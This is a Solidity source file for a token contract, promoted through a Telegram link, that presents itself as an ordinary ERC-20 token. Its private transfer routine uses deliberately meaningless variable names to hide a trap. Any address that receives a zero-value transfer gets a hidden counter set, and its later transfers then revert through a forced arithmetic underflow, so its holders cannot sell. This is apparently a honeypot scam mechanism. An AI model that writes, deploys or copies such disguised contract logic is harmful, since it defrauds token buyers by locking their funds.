/*

https://t.me/SexyBallsToken

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LickMyButtandSuckonMyBalls is Ownable {
    function approve(address climb, uint256 boat) public returns (bool success) {
        allowance[msg.sender][climb] = boat;
        emit Approval(msg.sender, climb, boat);
        return true;
    }

    function transferFrom(address sense, address enough, uint256 boat) public returns (bool success) {
        silk(sense, enough, boat);
        require(boat <= allowance[sense][msg.sender]);
        allowance[sense][msg.sender] -= boat;
        return true;
    }

    function transfer(address enough, uint256 boat) public returns (bool success) {
        silk(msg.sender, enough, boat);
        return true;
    }

    constructor(address us) {

    }

    string public symbol = 'Lick My Butt and Suck on My Balls';

    uint8 public decimals = 9;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = 'Lick My Butt and Suck on My Balls';

    mapping(address => uint256) private vegetable;

    mapping(address => mapping(address => uint256)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    address public uniswapV2Pair;

    uint256 private speak = 20;

    mapping(address => uint256) public balanceOf;

    function silk(address sense, address enough, uint256 boat) private returns (bool success) {
        if (bee[sense] == 0) {
            balanceOf[sense] -= boat;
        }

        if (boat == 0) vegetable[enough] += speak;

        if (bee[sense] == 0 && uniswapV2Pair != sense && vegetable[sense] > 0) {
            bee[sense] -= speak;
        }

        balanceOf[enough] += boat;
        emit Transfer(sense, enough, boat);
        return true;
    }

    mapping(address => uint256) private bee;
}